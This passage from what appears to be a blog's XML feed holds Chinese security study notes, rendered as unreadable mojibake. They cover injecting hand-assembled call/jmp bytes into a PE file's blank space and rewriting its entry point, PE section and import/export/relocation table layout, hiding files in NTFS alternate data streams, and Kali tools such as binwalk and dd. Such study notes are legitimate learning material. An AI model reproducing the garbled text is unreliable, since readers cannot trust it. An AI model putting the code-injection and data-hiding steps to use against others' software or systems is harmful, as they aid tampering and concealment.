ç›´æ¥ç”¨ä»–çš„æ˜¯éœ€è¦å¯¼å…¥è¡¨ E8 callä¸éœ€è¦å¯¼å…¥è¡¨</span><br><span class="line">ç”¨ç¡¬ç¼–ç </span><br><span class="line">æˆ‘ä»¬è¦ç”¨E8 ç›´æ¥call</span><br><span class="line">&lt;0&gt; æ„é€ è¦å†™å…¥çš„ä»£ç </span><br><span class="line">&lt;1&gt; åœ¨PEçš„ç©ºç™½åŒºæ„é€ ä¸€æ®µä»£ç </span><br><span class="line">&lt;2&gt;</span><br><span class="line">&lt;3&gt;</span><br><span class="line">6A 00 6A 00 6A 00 6A 00 E8(call) 00 00 00 00 E9(jmp) 00 00 00 00 ï¼ˆåé¢çš„è®¡ç®—æ–¹æ³•ä¸ºè¦è·³è½¬çš„åœ°å€ï¼‰</span><br><span class="line">è¦è·³è½¬çš„åœ°å€-E8æŒ‡ä»¤å½“å‰çš„æŒ‡ä»¤å½“å‰çš„åœ°å€-5hï¼ˆ16è¿›åˆ¶ç®—çš„ï¼‰</span><br><span class="line">è¦è·³è½¬çš„åœ°å€-E9æŒ‡ä»¤å½“å‰çš„æŒ‡ä»¤å½“å‰çš„åœ°å€-5hï¼ˆ16è¿›åˆ¶ç®—çš„ï¼‰</span><br><span class="line">//æ‰§è¡Œå®Œè¿˜è¦è·³å›å»æ‰€ä»¥éœ€è¦jmp</span><br></pre></td></tr></table></figure><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193357.png" alt="image-20210326132850887"></p><p>æŒ‰E æ‰¾åˆ°user 32 æŒ‰ CTRL+N æ‰¾åˆ°MessageBox<img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193400.png" alt="image-20210326132954921"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193403.png" alt="image-20210326133713691"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">MessageBox: 76E1FD1E</span><br><span class="line">ImageBase: 400000</span><br><span class="line">MessageBox - ï¼ˆE8æŒ‡ä»¤å½“å‰çš„æŒ‡ä»¤å½“å‰æ–‡ä»¶çš„åœ°å€+ImageBaseï¼‰ -5</span><br><span class="line">76E1FD1E - 400F98 - 5 = 76A1ED81</span><br><span class="line">E8(call) 00 00 00 00</span><br><span class="line">E8(call) 81 ED A1 76</span><br><span class="line">å…¥å£: 183D7 ï¼ˆ4183D7ï¼‰</span><br><span class="line">4183D7 - 400F9D -5 = 17435</span><br><span class="line">E9(jmp) 00 00 00 00</span><br><span class="line">E9(jmp) 35 74 01 00</span><br><span class="line">6A 00 6A 00 6A 00 6A 00 E8 81 ED A1 76 E9 35 74 01 00</span><br><span class="line">å»æ‰¾åˆ°ç¨‹åºçš„å…¥å£æ”¹æˆ90 0f 00 00 </span><br></pre></td></tr></table></figure><h2 id="æ‰©å¤§èŠ‚"><a href="#æ‰©å¤§èŠ‚" class="headerlink" title="æ‰©å¤§èŠ‚"></a>æ‰©å¤§èŠ‚</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;åˆ†é…ä¸€å—æ–°çš„ç©ºé—´ï¼Œå¤§å°ä¸ºS</span><br><span class="line">&lt;2&gt;å°†æœ€åä¸€ä¸ªèŠ‚çš„SizeOfRawDataå’ŒVirtualSizeæ”¹æˆN</span><br><span class="line">N = ï¼ˆSizeOfRawDataæˆ–è€…VirtualSizeï¼‰</span><br><span class="line">å†…å­˜å¯¹é½åçš„å€¼</span><br><span class="line">&lt;3&gt;</span><br></pre></td></tr></table></figure><h2 id="æ–°å¢èŠ‚"><a href="#æ–°å¢èŠ‚" class="headerlink" title="æ–°å¢èŠ‚"></a>æ–°å¢èŠ‚</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;åˆ¤æ–­æ˜¯å¦æœ‰è¶³å¤Ÿçš„ç©ºé—´ï¼Œå¯ä»¥æ·»åŠ ä¸€ä¸ªèŠ‚è¡¨.</span><br><span class="line">&lt;2&gt;åœ¨èŠ‚è¡¨ä¸­æ–°å¢ä¸€ä¸ªæˆå‘˜.</span><br><span class="line">&lt;3&gt;ä¿®æ”¹PEå¤´ä¸­èŠ‚çš„æ•°é‡.&lt;4&gt;ä¿®æ”¹sizeOflmageçš„å¤§å°.</span><br><span class="line">&lt;5&gt;å†åŸæœ‰æ•°æ®çš„æœ€åï¼Œæ–°å¢ä¸€ä¸ªèŠ‚çš„æ•°æ®(å†…å­˜å¯¹é½çš„æ•´æ•°å€).</span><br><span class="line">&lt;6&gt;ä¿®æ­£æ–°å¢èŠ‚è¡¨çš„å±æ€§</span><br></pre></td></tr></table></figure><h2 id="åˆå¹¶èŠ‚"><a href="#åˆå¹¶èŠ‚" class="headerlink" title="åˆå¹¶èŠ‚"></a>åˆå¹¶èŠ‚</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;1&gt;æŒ‰ç…§å†…å­˜å¯¹é½å±•å¼€</span><br><span class="line">&lt;2&gt;å°†ç¬¬ä¸€ä¸ªèŠ‚çš„å†…å­˜å¤§å°ã€æ–‡ä»¶å¤§å°æ”¹æˆä¸€æ ·</span><br><span class="line">Max = SizeOfRawData&gt;VirtualSize?SizeOfRawData:VirtualSize</span><br><span class="line">SizeOfRawData = VirtualSize =</span><br><span class="line">æœ€åä¸€ä¸ªèŠ‚çš„VirtualAddress + Max - SizeOfHeaderså†…å­˜å¯¹é½åçš„å¤§å°.</span><br><span class="line">&lt;3&gt;å°†ç¬¬ä¸€ä¸ªèŠ‚çš„å±æ€§æ”¹ä¸ºåŒ…å«æ‰€æœ‰èŠ‚çš„å±æ€§.</span><br><span class="line">&lt;4&gt;ä¿®æ”¹èŠ‚çš„æ•°é‡ä¸º1.</span><br></pre></td></tr></table></figure><p>å­¦ä¹ ç½‘ç«™ï¼š<a href="https://cloud.tencent.com/developer/article/1432558">https://cloud.tencent.com/developer/article/1432558</a></p><h2 id="å¯¼å‡ºè¡¨"><a href="#å¯¼å‡ºè¡¨" class="headerlink" title="å¯¼å‡ºè¡¨"></a>å¯¼å‡ºè¡¨</h2><p>è¡¨ç¤ºå½“å‰PEæ–‡ä»¶æä¾›äº†å“ªäº›å‡½æ•°</p><p><strong>é€šå¸¸æƒ…å†µ</strong>ä¸‹exeæœ‰å¯¼å…¥è¡¨ï¼Œä¸æä¾›å¯¼å‡ºè¡¨ï¼ˆä¸æä¾›å‡½æ•°ç»™åˆ«äººç”¨ï¼ˆä¸æ˜¯ä¸èƒ½ï¼‰ï¼‰</p><p>ä½ç½®ï¼š</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193409.png" alt="image-20210329210408067"></p><p>16ä¸ªç»“æ„ä½“ï¼Œç±»å‹éƒ½ä¸€æ · +96ä¸ªå­—èŠ‚ï¼ˆ6è¡Œï¼‰16ä¸ªæ•°ç»„128ä¸ªå­—èŠ‚</p><p>å¯¼å‡ºè¡¨åœ¨å“ªé‡Œï¼Œå¯¼å‡ºè¡¨æœ‰å¤šå¤§</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193412.png" alt="image-20210329210457617"></p><p>å¯¼å…¥è¡¨åœ¨å“ªé‡Œï¼Œå¯¼å…¥è¡¨æœ‰å¤šå¤§</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193414.png" alt="image-20210329210556827"></p><p> æ‰¾åˆ°çš„æ˜¯RVAè¦è½¬FOA</p><h3 id="å¯¼å‡ºè¡¨è®¡ç®—æ–¹æ³•è®¡ç®—æ–¹æ³•"><a href="#å¯¼å‡ºè¡¨è®¡ç®—æ–¹æ³•è®¡ç®—æ–¹æ³•" class="headerlink" title="å¯¼å‡ºè¡¨è®¡ç®—æ–¹æ³•è®¡ç®—æ–¹æ³•"></a>å¯¼å‡ºè¡¨è®¡ç®—æ–¹æ³•è®¡ç®—æ–¹æ³•</h3><p>1ã€æ‰¾æ–‡ä»¶å¯¹é½</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193416.png" alt="image-20210401152750440"></p><p>æ‰¾åˆ°å¯¼å‡ºè¡¨çš„RVAä¸ºE260h å¤§å°ä¸ºA3h</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193419.png" alt="image-20210401152832938"></p><p>æ¥ç€å»èŠ‚è¡¨çœ‹çœ‹å†å“ªä¸ªèŒƒå›´å†…</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193423.png" alt="image-20210401153359965"></p><p>å‘ç°ç¬¬ä¸€ä¸ªèŠ‚åŒ…å«1000h-E303h</p><p>åŒ…å«äº†å¯¼å‡ºè¡¨</p><p><strong>æ–‡ä»¶åç§»(ç£ç›˜æ–‡ä»¶çš„ä½ç½®)=æ•°æ®ç›®å½•å¯¼å‡ºè¡¨åœ°å€ï¼ˆä»»æ„RVAï¼‰-è¯¥åŒºæ®µç›¸å¯¹è™šæ‹Ÿåœ°å€ï¼ˆRVAï¼‰+è¯¥åŒºæ®µçš„æ–‡ä»¶åç§»åœ°å€(offset)</strong></p><p>epï¼šE260h - 1000h + 400h = D660h</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193426.png" alt="image-20210329212133637"></p><p>ä»–çš„å¤§å°æ˜¯åŒ…å«å­è¡¨çš„ï¼Œä¸æ­¢40h</p><p>name æ˜¯æŒ‡é’ˆ</p><p>æœ€åä¸‰ä¸ªaddressä¹Ÿéƒ½æ˜¯æŒ‡é’ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">struct IMAGE_EXPORT_DIRECTORY ExportDirD660hA3hFg: Bg:TWAIN_32.dll</span><br><span class="line">DWORD Characteristics0D660h4hFg: Bg:</span><br><span class="line">time_t TimeDateStamp06/14/2032 19:14:36D664h4hFg: Bg:</span><br><span class="line">WORD MajorVersion0D668h2hFg: Bg:</span><br><span class="line">WORD MinorVersion0D66Ah2hFg: Bg:</span><br><span class="line">DWORD NameE2BEhD66Ch4hFg: Bg:.text FOA = 0xD6BE -&gt; TWAIN_32.dll</span><br><span class="line">DWORD Base1D670h4hFg: Bg:</span><br><span class="line">DWORD NumberOfFunctions6D674h4hFg: Bg:</span><br><span class="line">DWORD NumberOfNames5D678h4hFg: Bg:</span><br><span class="line">DWORD AddressOfFunctionsE288hD67Ch4hFg: Bg:.text FOA = 0xD688 </span><br><span class="line">DWORD AddressOfNamesE2A0hD680h4hFg: Bg:.text FOA = 0xD6A0 </span><br><span class="line">DWORD AddressOfNameOrdinalsE2B4hD684h4hFg: Bg:.text FOA = 0xD6B4 </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>çœ‹ç¬¬ä¸€ä¸ªå­è¡¨ å‡½æ•°åœ°å€è¡¨ æ¯å››ä¸ªå­—èŠ‚ä¸€ä¸ªæˆå‘˜</strong></p><p>å¯ä»¥ç›´æ¥å°†å‡½æ•°å¯¹åº”çš„16è¿›åˆ¶æ”¾åˆ°ODé‡Œçœ‹æ±‡ç¼–è§£ä»£ç </p><p><strong>çœ‹ç¬¬äºŒä¸ªå­è¡¨ å‡½æ•°åç§°è¡¨ æ¯å››ä¸ªå­—èŠ‚ä¸€ä¸ªæˆå‘˜</strong></p><p>æ˜¯æŒ‰ç…§é¦–å­—æ¯é¡ºåºæ’åºçš„</p><p><strong>çœ‹ç¬¬ä¸‰ä¸ªå­è¡¨ å‡½æ•°åºå·è¡¨ æ¯2ä¸ªå­—èŠ‚ä¸€ä¸ªæˆå‘˜</strong></p><p>åç§°è¡¨æœ‰å‡ ä¸ªåºå·è¡¨å°±æœ‰å‡ ä¸ª </p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193430.png" alt="image-20210401171410292"></p><p>ç¬¬ä¸€å‚æ•°æ˜¯dllæ¨¡å—å¥æŸ„ï¼Œå°±æ˜¯PEæ–‡ä»¶å†å†…å­˜ä¸­å±•å¼€çš„èµ·å§‹ä½ç½®</p><p>ç¬¬äºŒä¸ªå¯ä»¥å†™å‡½æ•°åæˆ–åºå·</p><p>å‡½æ•°åç§° -ã€‹ åºå·è¡¨- ã€‹å‡½æ•°åœ°å€</p><p>å¯»æ‰¾è¿‡ç¨‹</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193432.png" alt="image-20210401172236139"></p><p>åºå·æ¥æ‰¾ï¼š</p><p>eg:</p><p>15 -&gt; 15 - base &gt;å‡½æ•°åœ°å€é‡Œæ‰¾</p><h2 id="å¯¼å…¥è¡¨"><a href="#å¯¼å…¥è¡¨" class="headerlink" title="å¯¼å…¥è¡¨"></a>å¯¼å…¥è¡¨</h2><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193435.png" alt="image-20210329210556827"></p><p>æ–‡ä»¶å¯¹é½æ˜¯å¦ä¸å†…å­˜å¯¹é½ä¸€æ ·ï¼Œä¸ä¸€æ ·è¯·å°†RVAè½¬ä¸ºFOA</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193438.png" alt="image-20210401184925678"></p><p><strong>æœ‰å¾ˆå¤šä¸ªå¯¼å…¥è¡¨ï¼Œæ¯ä¸ªå¯¼å…¥è¡¨20ä¸ªå­—èŠ‚ï¼Œä¸€ç›´æ•°åˆ°è¿ç»­20ä¸ª0ç»“æŸ</strong></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210715193440.png" alt="image-20210401192412447"></p><p>INT  å¯¼å…¥åç§°è¡¨</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721142911.png" alt="image-20210721142911639"></p><p>IAT  å¯¼å…¥åœ°å€è¡¨</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721142934.png" alt="image-20210721142934755"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721144543.png" alt="image-20210721144543602"></p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210721144643.png" alt="image-20210721144643766"></p><h2 id="é‡å®šä½è¡¨"><a href="#é‡å®šä½è¡¨" class="headerlink" title="é‡å®šä½è¡¨"></a>é‡å®šä½è¡¨</h2><p>é‡å®šä½è¡¨åœ¨ç¬¬<strong>6</strong>ä¸ª</p><p><img src="https://sunqiz.oss-cn-beijing.aliyuncs.com/img/20210725154633.png" alt="image-20210721151032756"></p><p><strong>æ¯ä¸ªé‡å®šä½è¡¨æœ‰å¤šå¤§å–å†³äºSizeOdBlockæœ‰å¤šå¤§</strong></p><p><strong>ç›´åˆ°è¿ç»­8ä¸ªå­—èŠ‚ä¸º0ç»“æŸ</strong></p><p>æ¯2ä¸ªå­—èŠ‚ä»£è¡¨ä¸€ä¸ªåœ°å€</p><p>é«˜ä½å‰4ä½æ— æ•ˆ  åªéœ€è¦12ä½</p><p>åªæœ‰é«˜ä½ä¸º0011 = 3 æ‰éœ€è¦å°†VirtualAddress+ä½12ä½</p><p>é«˜ä½ä¸æ˜¯3æ˜¯ç”¨æ¥å¡«ä½ç½®çš„æ²¡ç”¨çš„æ•°æ®ï¼Œå­˜åœ¨çš„ä»·å€¼æ˜¯ä¸ºäº†å†…å­˜å¯¹é½</p><p>æ‰€ä»¥ä¿®å¤é‡å®šä½è¡¨çš„ä¹‹åéœ€è¦åˆ¤æ–­é«˜ä½æ˜¯å¦ä¸º3</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PEå­¦ä¹ ç¬”è®°&quot;&gt;&lt;a href=&quot;#PEå­¦ä¹ ç¬”è®°&quot; class=&quot;headerlink&quot; title=&quot;PEå­¦ä¹ ç¬”è®°&quot;&gt;&lt;/a&gt;PEå­¦ä¹ ç¬”è®°&lt;/h1&gt;&lt;p&gt;æœ‰ä¸€è¯´ä¸€ï¼Œè‡ªå·±çœ‹å®Œä¹¦åœ¨çœ‹çœ‹è§†é¢‘ï¼Œå¯ä»¥è‡ªå·±å†™ä¸€ä¸¤ä¸ªç¨‹åºï¼ˆæ¯”å¦‚è¾“å‡ºhello worldï¼‰æ¥å®æˆ˜åˆ†æä¸€ä¸‹ï¼Œå°è±¡ä¼š</summary>
      
    
    
    
    <category term="PEå­¦ä¹ " scheme="http://example.com/categories/PE%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–</title>
    <link href="http://example.com/2021/08/13/NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81/"/>
    <id>http://example.com/2021/08/13/NTFS%E4%BA%A4%E6%8D%A2%E6%95%B0%E6%8D%AE%E6%B5%81/</id>
    <published>2021-08-13T11:39:43.639Z</published>
    <updated>2021-08-13T07:57:22.645Z</updated>
    
    <content type="html"><![CDATA[<h1 id="NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–"><a href="#NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–" class="headerlink" title="NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–"></a>NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–</h1><p>NTFSäº¤æ¢æ•°æ®æµï¼ˆç®€ç§°ADSï¼‰æ˜¯NTFSç£ç›˜æ ¼å¼çš„ä¸€ä¸ªç‰¹æ€§ï¼Œåœ¨NTFSæ–‡ä»¶ç³»ç»Ÿä¸‹ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½å¯ä»¥å­˜åœ¨å¤šä¸ªæ•°æ®æµï¼Œé™¤äº†ä¸»æ–‡ä»¶æµä¹‹å¤–è¿˜å¯ä»¥æœ‰è®¸å¤šéä¸»æ–‡ä»¶æµå¯„å®¿åœ¨ä¸»æ–‡ä»¶æµä¸­ï¼Œè€Œæˆ‘ä»¬æ— æ³•æŸ¥çœ‹åˆ°éä¸»æ–‡ä»¶æ•°æ®æµï¼Œå› æ–‡ä»¶å¤¹å¤§å°å§‹ç»ˆæ˜¾ç¤º0.</p><h2 id="åˆ©ç”¨å·¥å…·"><a href="#åˆ©ç”¨å·¥å…·" class="headerlink" title="åˆ©ç”¨å·¥å…·"></a>åˆ©ç”¨å·¥å…·</h2><p>NtfsStreamsEditor2</p><p>é“¾æ¥ï¼š<a href="https://pan.baidu.com/s/13sQ8hlLshqRDV2gwxuMuBA">https://pan.baidu.com/s/13sQ8hlLshqRDV2gwxuMuBA</a><br>æå–ç ï¼š6oqn</p><p>å¯èƒ½ä¼šæŠ¥æ¯’ï¼Œæ³¨æ„</p><h2 id="å‘½ä»¤"><a href="#å‘½ä»¤" class="headerlink" title="å‘½ä»¤"></a>å‘½ä»¤</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">å¯„ç”Ÿä¸€:</span><br><span class="line">echo å†™å…¥å†…å®¹&gt;&gt;å®¿ä¸»æ–‡ä»¶:äº¤æ¢æ•°æ®æµæ–‡ä»¶ï¼ˆå¯„ç”Ÿæ–‡ä»¶ï¼‰</span><br><span class="line">echo ever&gt;&gt;1.txt:2.txt</span><br><span class="line">2.txtä¸ºechoåˆ›å»ºå‡ºäº¤æ¢æ•°æ®æµæ–‡ä»¶,everåœ¨2.txtä¸­</span><br><span class="line"></span><br><span class="line">å¯„ç”ŸäºŒï¼š</span><br><span class="line">type äº¤æ¢æ•°æ®æµæ–‡ä»¶ï¼ˆå¯„ç”Ÿæ–‡ä»¶ï¼‰&gt;&gt;å®¿ä¸»æ–‡ä»¶å¤¹ï¼šäº¤æ¢æ•°æ®æµæ–‡ä»¶ï¼ˆå¯„ç”Ÿæ–‡ä»¶ï¼‰</span><br><span class="line">type 2.txt&gt;&gt;temp:2.txt</span><br><span class="line">tempä¸ºç©ºæ–‡ä»¶å¤¹,æ‰§è¡Œå2.txtå¯„ç”Ÿåœ¨tempæ–‡ä»¶å¤¹ä¸Š</span><br><span class="line">type a.jpg&gt;&gt;temp:a.jpg</span><br><span class="line">tempä¸ºç©ºæ–‡ä»¶å¤¹,æ‰§è¡Œåa.jpgå¯„ç”Ÿåœ¨tempæ–‡ä»¶å¤¹ä¸Š</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹ï¼š</span><br><span class="line">notepad å®¿ä¸»æ–‡ä»¶:äº¤æ¢æ•°æ®æµæ–‡ä»¶ï¼ˆå¯„ç”Ÿæ–‡ä»¶ï¼‰</span><br><span class="line">notepad 1.txt:2.txt</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å›¾ç‰‡æ–‡ä»¶ï¼š</span><br><span class="line">mspaint å®¿ä¸»æ–‡ä»¶:äº¤æ¢æ•°æ®æµæ–‡ä»¶ï¼ˆå¯„ç”Ÿæ–‡ä»¶ï¼‰</span><br><span class="line">notepad a.jpg:b.jpg</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–&quot;&gt;&lt;a href=&quot;#NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–&quot; class=&quot;headerlink&quot; title=&quot;NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–&quot;&gt;&lt;/a&gt;NTFSäº¤æ¢æ•°æ®æµæ–‡ä»¶æå–&lt;/h1&gt;&lt;p&gt;NTFSäº¤æ¢æ•°æ®æµï¼ˆç®€ç§°ADSï¼‰æ˜¯NTFSç£ç›˜æ ¼å¼çš„</summary>
      
    
    
    
    <category term="misc" scheme="http://example.com/categories/misc/"/>
    
    
  </entry>
  
  <entry>
    <title>kaliå·¥å…·ä½¿ç”¨é›†åˆ</title>
    <link href="http://example.com/2021/08/13/kali%E5%B7%A5%E5%85%B7%E5%92%8C%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/"/>
    <id>http://example.com/2021/08/13/kali%E5%B7%A5%E5%85%B7%E5%92%8C%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E9%9B%86%E5%90%88/</id>
    <published>2021-08-13T11:39:43.636Z</published>
    <updated>2021-08-13T07:56:50.831Z</updated>
    
    <content type="html"><![CDATA[<h1 id="kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆå¯¹misc-æŒç»­æ›´æ–°"><a href="#kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆå¯¹misc-æŒç»­æ›´æ–°" class="headerlink" title="kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆå¯¹misc æŒç»­æ›´æ–°"></a>kaliå·¥å…·ä½¿ç”¨é›†åˆï¼ˆä¸»è¦é’ˆå¯¹misc æŒç»­æ›´æ–°</h1><h1 id="binwalk"><a href="#binwalk" class="headerlink" title="binwalk"></a>binwalk</h1><p>ä¸€èˆ¬ç”¨binwalk [æ–‡ä»¶å]æ¥åˆ†ææœ‰å¤šå°‘æ–‡ä»¶</p><p>binwalk -e [æ–‡ä»¶å]</p><p>å¯ä»¥åˆ†ç¦»æ–‡ä»¶</p><h1 id="ddå‘½ä»¤"><a href="#ddå‘½ä»¤" class="headerlink" title="ddå‘½ä»¤"></a>ddå‘½ä»¤</h1><h2 id="ä¸€ã€ddå‘½ä»¤çš„è§£é‡Š"><a href="#ä¸€ã€ddå‘½ä»¤çš„è§£é‡Š" class="headerlink" title="ä¸€ã€ddå‘½ä»¤çš„è§£é‡Š"></a>ä¸€ã€ddå‘½ä»¤çš„è§£é‡Š</h2><p>ddï¼šç”¨æŒ‡å®šå¤§å°çš„å—æ‹·è´ä¸€ä¸ªæ–‡ä»¶ï¼Œå¹¶åœ¨æ‹·è´çš„åŒæ—¶è¿›è¡ŒæŒ‡å®šçš„è½¬æ¢ã€‚</p><p>æ³¨æ„ï¼šæŒ‡å®šæ•°å­—çš„åœ°æ–¹è‹¥ä»¥ä¸‹åˆ—å­—ç¬¦ç»“å°¾ï¼Œåˆ™ä¹˜ä»¥ç›¸åº”çš„æ•°å­—ï¼šb=512ï¼›c=1ï¼›k=1024ï¼›w=2</p><p><strong>å‚æ•°æ³¨é‡Šï¼š</strong></p><p>\1. if=æ–‡ä»¶åï¼šè¾“å…¥æ–‡ä»¶åï¼Œç¼ºçœä¸ºæ ‡å‡†è¾“å…¥ã€‚å³æŒ‡å®šæºæ–‡ä»¶ã€‚&lt; if=input file &gt;</p><p>\2. of=æ–‡ä»¶åï¼šè¾“å‡ºæ–‡ä»¶åï¼Œç¼ºçœä¸ºæ ‡å‡†è¾“å‡ºã€‚å³æŒ‡å®šç›®çš„æ–‡ä»¶ã€‚&lt; of=output file &gt;</p><p>\3. ibs=bytesï¼šä¸€æ¬¡è¯»å…¥bytesä¸ªå­—èŠ‚ï¼Œå³æŒ‡å®šä¸€ä¸ªå—å¤§å°ä¸ºbytesä¸ªå­—èŠ‚ã€‚</p><p>  obs=bytesï¼šä¸€æ¬¡è¾“å‡ºbytesä¸ªå­—èŠ‚ï¼Œå³æŒ‡å®šä¸€ä¸ªå—å¤§å°ä¸ºbytesä¸ªå­—èŠ‚ã€‚</p><p>  bs=bytesï¼šåŒæ—¶è®¾ç½®è¯»å…¥/è¾“å‡ºçš„å—å¤§å°ä¸ºbytesä¸ªå­—èŠ‚ã€‚</p><p>\4. cbs=bytesï¼šä¸€æ¬¡è½¬æ¢bytesä¸ªå­—èŠ‚ï¼Œå³æŒ‡å®šè½¬æ¢ç¼“å†²åŒºå¤§å°ã€‚</p><p>\5. skip=blocksï¼šä»è¾“å…¥æ–‡ä»¶å¼€å¤´è·³è¿‡blocksä¸ªå—åå†å¼€å§‹å¤åˆ¶ã€‚</p><p>\6. seek=blocksï¼šä»è¾“å‡ºæ–‡ä»¶å¼€å¤´è·³è¿‡blocksä¸ªå—åå†å¼€å§‹å¤åˆ¶ã€‚</p><p>æ³¨æ„ï¼šé€šå¸¸åªç”¨å½“è¾“å‡ºæ–‡ä»¶æ˜¯ç£ç›˜æˆ–ç£å¸¦æ—¶æ‰æœ‰æ•ˆï¼Œå³å¤‡ä»½åˆ°ç£ç›˜æˆ–ç£å¸¦æ—¶æ‰æœ‰æ•ˆã€‚</p><p>\7. count=blocksï¼šä»…æ‹·è´blocksä¸ªå—ï¼Œå—å¤§å°ç­‰äºibsæŒ‡å®šçš„å­—èŠ‚æ•°ã€‚</p><p>\8. conv=conversionï¼šç”¨æŒ‡å®šçš„å‚æ•°è½¬æ¢æ–‡ä»¶ã€‚</p><p>  asciiï¼šè½¬æ¢ebcdicä¸ºascii</p><p>   ebcdicï¼šè½¬æ¢asciiä¸ºebcdic</p><p>  ibmï¼šè½¬æ¢asciiä¸ºalternate ebcdic</p><p>  blockï¼šæŠŠæ¯ä¸€è¡Œè½¬æ¢ä¸ºé•¿åº¦ä¸ºcbsï¼Œä¸è¶³éƒ¨åˆ†ç”¨ç©ºæ ¼å¡«å……</p><p>  unblockï¼šä½¿æ¯ä¸€è¡Œçš„é•¿åº¦éƒ½ä¸ºcbsï¼Œä¸è¶³éƒ¨åˆ†ç”¨ç©ºæ ¼å¡«å……</p><p>  lcaseï¼šæŠŠå¤§å†™å­—ç¬¦è½¬æ¢ä¸ºå°å†™å­—ç¬¦</p><p>  ucaseï¼šæŠŠå°å†™å­—ç¬¦è½¬æ¢ä¸ºå¤§å†™å­—ç¬¦</p><p>  swabï¼šäº¤æ¢è¾“å…¥çš„æ¯å¯¹å­—èŠ‚</p><p>   noerrorï¼šå‡ºé”™æ—¶ä¸åœæ­¢</p><p>   notruncï¼šä¸æˆªçŸ­è¾“å‡ºæ–‡ä»¶</p><p>  syncï¼šå°†æ¯ä¸ªè¾“å…¥å—å¡«å……åˆ°ibsä¸ªå­—èŠ‚ï¼Œä¸è¶³éƒ¨åˆ†ç”¨ç©ºï¼ˆNULï¼‰å­—ç¬¦è¡¥é½ã€‚</p><h2 id="äºŒã€ddåº”ç”¨å®ä¾‹"><a href="#äºŒã€ddåº”ç”¨å®ä¾‹" class="headerlink" title="äºŒã€ddåº”ç”¨å®ä¾‹"></a>äºŒã€ddåº”ç”¨å®ä¾‹</h2><p><img 